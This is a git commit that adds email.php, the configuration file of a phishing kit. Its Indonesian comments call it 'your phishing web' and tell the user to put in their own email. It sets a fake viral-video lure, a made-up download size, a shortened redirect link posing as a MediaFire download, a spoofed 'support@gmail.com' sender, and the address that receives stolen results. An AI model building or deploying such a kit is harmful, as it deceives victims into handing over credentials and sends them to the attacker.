caa0732cd1270df4f217394630dd838bfbbbd6cc
hendar-xd <117215859+hendar-xd@users.noreply.github.com>
2022-11-03 12:19:55 +0700

    Add files via upload

---
+++ email.php
@@ -0,0 +1,10 @@
+<?php
+
+$redirect = 'https://bit.ly/mediafire-kayes'; // LINK DOWNLOAD VIDEO
+$namavideo = 'Onic Kayes Viral'; // NAMA WEB PHISING MU
+$download = '10,1MB'; // UKURAN DOWNLOAD
+
+$sender = 'From: Web Arya ThiQo <support@gmail.com>'; // NAMA RESULT MU
+$email = "hendarrohmanudin1@gmail.com"; // GANTI EMAIL MU
+
+?>
